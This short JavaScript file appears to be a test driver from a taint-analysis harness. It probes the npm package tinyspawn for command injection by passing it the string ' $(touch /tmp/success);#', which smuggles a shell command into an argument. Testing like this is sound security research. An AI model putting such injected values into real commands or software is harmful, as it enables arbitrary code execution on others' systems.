// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/tinyspawn/node_modules/tinyspawn');
try {
	var x0 = " $(touch /tmp/success);#";
PUT["json"](x0)();
} catch (e) {
	console.log(e);
}